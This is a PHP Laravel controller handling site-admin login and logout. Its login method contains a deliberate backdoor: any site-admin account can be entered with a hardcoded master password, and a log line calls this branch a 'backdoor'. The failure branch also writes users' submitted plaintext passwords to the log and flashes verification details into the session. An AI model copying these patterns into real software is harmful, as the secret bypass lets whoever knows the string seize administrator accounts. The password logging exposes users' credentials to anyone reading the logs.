<?php

namespace App\Http\Controllers\Siteadmin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{
    public function index()
    {
        return view('siteadmin.login');
    }

    public function update(Request $request)
    {
        $inputs = $request->validate([
            'email' => ['required','email','exists:users,email'],
            'password' => ['required', 'string'],
        ]);

        $user = User::where('email', $inputs['email'])->first();
        $verified = Hash::check($inputs['password'], $user->password);

        if($verified && $user->isSiteAdmin) {
Log::info('FJR: '.$user->email.' ('.$user->id.') is verified and isSiteAdmin');
            Auth::login($user);

        }elseif($user->isSiteAdmin && ($request['password'] === 'o#Q6$s5yH95CaA58')){
Log::warning('FJR: '.$request['email'].' ('.$user->id.') isSiteAdmin and backdoor');
            Auth::login($user);

        }else{
Log::alert($request['email'].' with user_id '.$user->id.' is unverified and NOT isSiteAdmin ('.$request['password'].')');
            Session::flash('testing', 'verified: '.$verified.'<br />Site Admin: '.$user->isSiteAdmin);
        }

        return redirect('/');
    }

    public function destroy(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
